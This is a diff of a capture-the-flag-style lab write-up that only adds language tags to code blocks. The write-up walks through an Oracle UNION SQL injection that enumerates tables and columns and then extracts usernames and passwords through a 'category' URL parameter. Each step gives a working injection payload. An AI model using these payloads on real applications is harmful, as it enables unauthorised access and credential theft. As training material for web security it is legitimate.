@@ -23,31 +23,31 @@ The application has a login function, and the database contains a table that hol
 
 List the table names with
 
-```
+```sql
 SELECT table_name from all_tables
 ```
 
-```
+```url
 /filter?category=Pets'+union+all+select+'1',table_name+from+all_tables-- -
 ```
 
 The interesting one seems "USERS_RKNNZQ". 
 
-```
+```sql
 SELECT COLUMN_NAME from all_tab_columns WHERE table_name = 'USERS_RKNNZQ'
 ```
 
-```
+```url
 /filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name+=+'USERS_RKNNZQ'-- -
 ```
 
 Finally:
 
-```
+```sql
 SELECT USERNAME_NJQLJN,PASSWORD_SPCMSH from USERS_RKNNZQ
 ```
 
-```
+```url
 /filter?category=Pets'+union+all+select+USERNAME_NJQLJN,PASSWORD_SPCMSH+from+USERS_RKNNZQ-- -
 ```
 
